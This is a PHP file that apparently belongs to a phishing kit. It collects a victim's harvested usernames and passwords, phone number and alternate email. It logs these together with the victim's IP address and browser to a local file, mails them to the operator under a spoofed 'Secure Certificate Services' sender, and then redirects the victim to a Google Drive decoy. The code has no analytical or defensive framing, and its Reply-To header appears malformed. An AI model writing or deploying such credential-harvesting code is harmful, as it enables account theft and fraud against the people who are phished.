<?php

session_start();

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

$country = $_SESSION['country'];

if(isset($_SESSION['username_first']))  {

$username_first = $_SESSION['username_first'];

}

if(isset($_SESSION['password_first']))  {

$password_first = $_SESSION['password_first'];

}

if(isset($_SESSION['username_second']))  {

$username_second = $_SESSION['username_second'];

}

if(isset($_SESSION['password_second']))  {

$password_second = $_SESSION['password_second'];

}

if(!empty($_POST['alternate_email']))  {

$alternate_email = $_POST['alternate_email'];

}

if(!empty($_POST['phone_number']))  {

$phone_number = $_POST['phone_number'];

date_default_timezone_set('America/Chicago');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

require "includes/my_email.php";

$msg = "-----------------------------------\n";
$msg .= "Phone Number: ".$phone_number."\n";
if(isset($alternate_email))  {
$msg .= "Alternate Email Address: ".$alternate_email."\n"; }
$msg .= "-----------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "Country: $country\n";
$msg .= "------------------------------------\n";

$subject = "Other  $ip";
$headers = "From: Secure Certificate Services <Noreply>\r\n";
$headers .= "Reply-To: Email Full Details <$my_deparmentcredits@gmail.com">\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

$fp = fopen("logs/email_full_details.txt", "a");
fputs($fp, $msg);
fclose($fp);

mail($my_email,$subject,$msg,$headers);

header("Location: https://drive.google.com/file/d/0BwQW_LHWYsi8RzFjeE1IZE9QNnc/");

}

?>